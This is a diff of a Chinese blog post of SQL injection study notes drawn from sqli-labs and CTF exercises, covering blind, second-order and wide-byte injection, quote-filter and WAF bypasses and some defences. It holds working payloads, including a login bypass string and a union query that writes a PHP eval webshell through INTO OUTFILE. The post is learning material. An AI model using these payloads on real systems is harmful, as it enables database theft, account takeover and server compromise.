@@ -467,21 +467,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-22
+                    2021-08-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    10.1k
+                    11k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    39 分
+                    43 分
                 </div>
                 
 
@@ -635,7 +635,9 @@
 <li>第三个参数，new_value，string格式，替换查找到的符合条件的数据</li>
 </ol>
 </li>
+<li>还有其他很多的报错注入函数：</li>
 </ol>
+<p><img src="/images/image-20210804160842031.png"></p>
 <p>但在这里我们并不正确的使用这些函数，而是让他们报错，在报错的地方来看到敏感信息，</p>
 <p>接下来来看这些语句的使用，还是以ctfhub的报错注入作为例子</p>
 <ul>
@@ -697,6 +699,7 @@ urlOpen<span class="token operator">=</span><span class="token string">'http://c
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p>
+<p>对于这种脚本最好用二分法进行优化一下，不然会很慢的，自己写一下挺简单的，会快不少。</p>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>也叫时间延时注入，这种注入在我们输入单引号，双引号，小括号时他都不会显示出报错（但其实是已经出错了），页面不会改变，这时候就需要通过if(),sleep()函数，使得我们的判断条件为真时会有页面延时的情况出现，即，构造好了语句，如果我们想要判断的条件为真，则页面执行会出现延迟，如果为假则不会有延迟。给出一个语句实例：<code>?id=-1 or if(select ascii(substr(table_name,1,1)) from informatio_schema.tables where tabel_schema=database() limit 0,1)=100,sleep(2),0) #</code></p>
 <p>首先看一下if()和sleep()</p>
 <ul>
@@ -788,7 +791,7 @@ Referer: 1        #这样才对
 <p>还是先要判断注入点和注入类型，然后再在这里进行文件的读取，比如<code>?id=1&#39; union select 1,load_file(&quot;C:\\www\\sqli&quot;)</code>,然后在?id前的路径出写上想要访问的文件如:”index,php”</p>
 <p>写入文件：</p>
 <p>函数outfile(),和load_file很类似，比如</p>
-<p><code>?id=1&#39; union select 1,2,&quot;&lt;?php @eval($_POST[aaa];?)&quot; into outfile &quot;C:\\www\\sqli\\a.txt&quot; #</code></p>
+<p><code>?id=1&#39; union select 1,2,&quot;&lt;?php @eval($_POST[aaa];?&gt;&quot; into outfile &quot;C:\\www\\sqli\\a.txt&quot; #</code></p>
 <p>这样就将一个一句话木马写入了文件a.txt（注意，还是要有绝对路径和权限才行），这样就可上传一个一句话木马，再拿webshell、</p>
 <h3 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h3><p>简单的加注释消除报错失败，注释符会被过滤掉，这种时候我们需要使用别的方法来在发现注入点，报错后消除报错，这种时候需要对sql语法的熟练以及一些骚操作整除一些畸形的语句，使其闭合，在课程中讲解人使用的是?id=1’ or(select….) or’这样可以让语句闭合，也需要通过不断的实验以及分析报错的提醒来得到正确的语法</p>
 <p>这里以sqli的less-23作为演示</p>
@@ -823,7 +826,7 @@ Referer: 1        #这样才对
 <p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(nalhiirshz)/**/from/**/ppaymrtivl</code></p>
 <p>得到flag，总觉得ctfhub的环境怪怪的，不能闭合还是能继续往下走<del>肯定不是我的问题</del></p>
 <h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>这里视频里是用的less-27作为环境，使用内联注释绕过失败了，<del>尴尬</del>但方法得记住，内联注释就是将被过滤掉的语句使用/*!*/包裹起来，比如如果select被过滤掉了则我们使用/*!select*/来进行包裹，可能能绕过过滤，视频里这样不知道为啥失败了，老师使用了另外两种方法，一是大小写，比如写成selEct,以及拼接，在select中再放一个select<code>selselectect</code>这样中间的完整的select被过滤掉以后外层的拼接起来就好了。<del>大概就是这样，不想实验了，累了</del></p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当<strong>MySQL使用GBK</strong>作为编码时会用两个字节作为汉字，有的时候网站会通过<strong>加上反斜杠</strong>来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当<strong>MySQL使用GBK</strong>作为编码时会用两个字节作为汉字，有的时候网站会通过<strong>加上反斜杠</strong>来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入。</p>
 <p>以less-33为例子</p>
 <p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1&#39;</code></p>
 <p>加入单引号后没有报错，页面上显示出hint：Hint: The Query String you input is escaped as : 1\‘</p>
@@ -836,6 +839,13 @@ Referer: 1        #这样才对
 <li>使用mysqlreal_escape_string.函数，同时使用mysql_set_charset(‘gbk’, $conn);即可防御</li>
 <li>可以设置参数，character_set_client= binary</li>
 </ul>
+<p><strong>对于对单引号的过滤，宽字节无法使用时，可以使用16进制的方式尝试绕过</strong>，比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1 from aa where name &#x3D;&#39;abc&#39; 如果单引号被过滤那么where后就不能被执行，这时候就将abc转化为16进制，即where name&#x3D;0x616263即可绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
 <h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>当php中使用了urldecode函数，且放置位置不恰当时，会和php本身的编码配合失误，造成漏洞。当我们输入?id=1’时网站加上反斜杠，但当我们使用二次编码注入就可以绕过，具体如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">id&#x3D;%2527，通过php自身编码，%25被转译为&quot;%&quot;，此时为id&#x3D;%27,若使用了urldecode函数，%27被转译为单引号，就不会被加上反斜杠了 
 %25是&quot;%&quot;，%27是&quot;&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -889,7 +899,6 @@ Oracle 10G 之后版本:
 ALTER TABLE table_name MODIFY column_name datatype;
 flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>+++++++++</p>
 <h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>记录一道题的解法，是[极客大挑战 2019]EasySQL的题目，</p>
 <p>登录后发现是get型传递参数，加单引号报错，可以看到是字符型，这里使用了一种<strong>万能密码</strong></p>
 <p><code>http://f8759e96-bef7-4955-bd4e-371420693b66.node3.buuoj.cn/check.php?username=admin&#39;or &#39;1&#39;=&#39;1&amp;password=admin&#39;or &#39;1&#39;=&#39;1</code></p>
@@ -953,10 +962,58 @@ flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" cla
 <li>执行命令（比如SQLServer sa权限）</li>
 <li>读文件（读中间配置文件，读数据库配置文件）</li>
 <li>写文件（写webshell到网站目录</li>
-<li>）</li>
 </ul>
 </li>
 </ul>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入的原理是：虽然开发者对sql语句进行了过滤，比如在查询时，将<code>id=1&#39;</code>中单单引号进行转译，转化成了<code>id=1\&#39;</code>进行执行，如果将其这个数据存储到数据库中却是存储的原来的数据即<code>id=1&#39;</code>，开发者如果将已经在数据库中单信息视作安全，在后续调用该参数的时候没有再进行过滤转译，导致在读取时造成了注入，这就是二次注入点原理，这里以sql-labs-24为例做一个演示</p>
+<p>这一关的想法是通过二次注入来修改正常用户的密码，在开始时会进行用户注册，注册成功后登录该用户会要求该用户修改密码：</p>
+<p>首先注册一个test用户，密码test</p>
+<p><img src="/images/image-20210802142726344.png"></p>
+<p>再注册一个test’ #用户，密码为123：</p>
+<p>注意，此时sql语句中username被转义，是test\‘ #,但保存到数据库中的username却是test&#39; #</p>
+<p>登录test&#39; #修改密码为aaa</p>
+<p><img src="/images/image-20210802142837143.png"></p>
+<p>在数据库中可以看到</p>
+<p><img src="/images/image-20210802143229400.png"></p>
+<p>可以看到，密码被修改的是用户test而不是test&#39; #，这样我们就完成了对test用户账号的窃取</p>
+<p>看一下修改密码的源代码：</p>
+<p><img src="/images/image-20210802143504306.png"></p>
+<p>可以看见，在进行update时并没有进行过滤以及转义。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>语句中$username现在是test’ #，则现在的语句为：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='test' #'and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#有效语句为：</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> "<span class="token constant">UPDATE</span> users <span class="token constant">SET</span> <span class="token constant">PASSWORD</span><span class="token operator">=</span><span class="token single-quoted-string string">'$pass'</span> where username<span class="token operator">=</span><span class="token single-quoted-string string">'test'</span>
+这里直接就会将test用户的密码进行更改，实现了二次注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>防御：在对sql语句进行过滤以及转义时，除了要小心各个普通的查询和注入点，已经存入数据库的数据在进行取用时也需要进行过滤以及转义，防止二次注入的产生。</li>
+</ul>
+<h3 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h3><p>对于sql注入来说，在进行真实的渗透测试时，遇见waf才是绝大多数情况。如何绕过waf是我们需要进行掌握和熟练的。</p>
+<p>从大的方面来说，在进行黑盒测试有如下的绕过原理：</p>
+<ol>
+<li>架构层绕过WAF<ol>
+<li>寻找源站→针对云WAF</li>
+<li>利用同网断→绕过WAF防护区域</li>
+<li>利用边界漏洞→绕过WAF防护区域</li>
+</ol>
+</li>
+<li>利用边界漏洞→绕过WAF防护区域<ol>
+<li>POST大BODY协议层面绕过WAF的检测</li>
+</ol>
+</li>
+<li>协议未覆盖绕过waf<ol>
+<li>请求方式变换：GET→POST Content-Typesta：application/x-www-form-urlencoded；multipart/form-data；</li>
+<li>参数污染</li>
+</ol>
+</li>
+<li>规则层面的绕过（主要的绕过方式）（以sql注入为例）</li>
+</ol>
+<p><img src="/images/image-20210804165557793.png"></p>
+<p>在知道原理后该如何进行绕过呢？那就是通过fuzz进行绕过，fuzz，模糊测试，<strong>在这里简单来说就是对于这些可能成功的绕过方法进行自动化或者半自动化的测试</strong>，例如：</p>
+<p><img src="/images/image-20210804165821212.png"></p>
+<p>对于空白字符进行的过滤通过脚本或者burp等工具进行不断的测试，直到绕过，接下来在遇到新的防护规则时又继续fuzz</p>
 
                 
             </div>
@@ -1758,7 +1815,7 @@ flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" cla
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">78.3k</span>&nbsp;字
+                class="white-color">80.2k</span>&nbsp;字
             
             
             
